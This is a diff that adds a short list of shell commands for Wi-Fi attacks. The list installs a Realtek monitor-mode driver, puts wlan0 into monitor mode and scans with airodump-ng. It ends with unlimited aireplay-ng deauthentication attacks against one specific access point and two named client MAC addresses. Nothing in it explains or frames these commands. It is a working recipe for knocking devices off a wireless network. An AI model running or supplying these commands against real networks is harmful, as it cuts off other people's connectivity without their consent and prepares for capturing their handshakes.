@@ -1,0 +1,16 @@
+echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
+git clone https://github.com/aircrack-ng/rtl8188eus.git
+cd rtl8188eus
+make -j4
+make install
+service network-manager stop
+service avahi-daemon stop
+--conectar
+airmon-ng check kill
+iw wlan0 set type monitor
+rfkill unblock wifi
+ip l s wlan0 up
+airodump-ng wlan0
+airodump-ng -d 58:25:75:9e:39:94 -c 11 wlan0
+aireplay-ng -0 0 -a 58:25:75:9e:39:94 -c d0:03:df:4e:5d:6f wlan0
+aireplay-ng -0 0 -a 58:25:75:9e:39:94 -c da:1e:47:e1:0f:8b wlan0
